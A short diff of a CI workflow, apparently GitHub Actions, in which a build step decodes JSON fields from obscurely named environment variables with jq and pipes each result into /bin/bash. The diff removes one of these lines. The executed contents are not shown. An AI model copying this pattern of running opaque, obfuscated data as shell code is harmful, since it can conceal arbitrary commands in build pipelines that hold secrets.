@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$hli01" | jq -r .ki3 | /bin/bash
           printf '%s' "$plwrw6924" | jq -r .ecj94 | /bin/bash
-          echo $njj34845 | jq -r .sxq16416 | /bin/bash
           echo $ocjpo7 | jq -r .c4309 | /bin/bash
 
       - name: Store artifact
